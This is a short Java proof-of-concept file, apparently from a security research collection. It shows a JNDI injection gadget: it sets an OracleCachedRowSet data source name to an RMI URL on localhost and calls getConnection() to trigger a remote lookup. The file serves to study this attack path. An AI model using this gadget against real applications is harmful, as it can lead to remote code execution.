package oracle;

import oracle.jdbc.rowset.OracleCachedRowSet;

/**
 * @author Whoopsunix
 */
public class JNDI {
    public static void main(String[] args) throws Exception{
        OracleCachedRowSet oracleCachedRowSet = new OracleCachedRowSet();
        oracleCachedRowSet.setDataSourceName("rmi://127.0.0.1:1099/vabnob");
        oracleCachedRowSet.getConnection();
    }
}
